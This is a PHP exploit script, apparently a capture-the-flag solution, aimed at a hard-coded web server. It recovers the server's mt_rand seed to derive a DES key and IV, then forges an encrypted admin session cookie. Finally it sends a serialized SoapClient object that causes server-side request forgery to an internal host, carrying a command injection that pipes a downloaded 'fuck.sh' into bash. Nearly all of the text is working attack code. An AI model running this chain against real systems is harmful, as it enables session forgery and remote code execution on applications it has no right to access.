<?php

define("URL", 'http://121.37.161.79:2333/');

function curl_get($cookies = false) {
	$header = [];
	if ($cookies) {
		$header[] = 'Cookie: ' . implode(';', $cookies);
	}
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, URL);
	curl_setopt($curl, CURLOPT_HEADER, 1);
	curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookie.jar');
	$data = curl_exec($curl);
	if (curl_error($curl)) {
		print "Error: " . curl_error($curl);
	} else {
		list($h, $b) = explode("\r\n\r\n", $data);
		preg_match_all("/set\-cookie: (\w+)=(.*?);([^\r\n]*)/i", $h, $matches);
		$c = [];
		foreach ($matches[0] as $key => $value) {
			$c[$matches[1][$key]] = $matches[2][$key];
		}
		return [
			'c' => $c,
			'b' => $b,
		];
		curl_close($curl);
	}
}

$GUEST = 'O:4:"User":1:{s:8:"username";s:5:"guest";}';
$IV = 'vvvvvvvv';
$res = curl_get();

$PHPSESSID = $res['c']['PHPSESSID'];

// Get KEY

preg_match_all("/\<td\>(\d+)\<\/td\>/", $res['b'], $matches);
$seed = trim(shell_exec(sprintf('python3 reverse_mt_rand.py %s %s 0 1', $matches[1][0], $matches[1][2])));
mt_srand($seed);
$mr[] = mt_rand();
for ($i = 1; $i < 226; $i++) {
	mt_rand();
}
$diff = array_diff($mr, $matches[1]);
$mr[] = mt_rand();
$mr[] = mt_rand();
if (count($diff) > 0) {
	die('mt_rand error');
}
$mtrand = mt_rand();
$KEY = strval($mtrand & 0x5f5e0ff);

// GET IV

$user = base64_decode($res['c']['user']);
$uid = openssl_decrypt($user, 'des-cbc', $KEY, 0, $IV);
$GIV = '';
for ($i = 0; $i < strlen($IV); $i++) {
	$GIV .= chr(ord($IV[$i]) ^ ord($uid[$i]) ^ ord($GUEST[$i]));
}
$uid = openssl_decrypt($user, 'des-cbc', $KEY, 0, $GIV);
if ($uid !== $GUEST) {
	die("IV error");
}

// GET Hint

$ADMIN = 'O:4:"User":1:{s:8:"username";s:5:"admin";}';
$hash = md5($ADMIN);
$cipher = openssl_encrypt($ADMIN, "des-cbc", $KEY, 0, $GIV);
$user = urlencode(base64_encode($cipher));
$cookies = [
	'PHPSESSID=' . $PHPSESSID,
	'user=' . $user,
	'hash=' . $hash,
];
$res = curl_get($cookies);
if (strpos($res['b'], 'maybe something useful') === false) {
	print_r($res);
	die('Not success');
}

// SSRF

print_r("SSRF...");
$pl = 'http://10.10.1.12/index.php?cc=' . urlencode('`$cc`;curl xxx/fuck.sh --output - | bash');
$obj = new SoapClient(null, [
	'uri' => '/vkorz',
	'location' => $pl,
]);
$obj->username = "admin";
$ser_obj = serialize($obj);
$cipher = openssl_encrypt($ser_obj, "des-cbc", $KEY, 0, $GIV);
$user = base64_encode($cipher);
$hash = md5($ser_obj);
$cookies = [
	'PHPSESSID=' . $PHPSESSID,
	'user=' . $user,
	'hash=' . $hash,
];
$res = curl_get($cookies);
print_r($res);
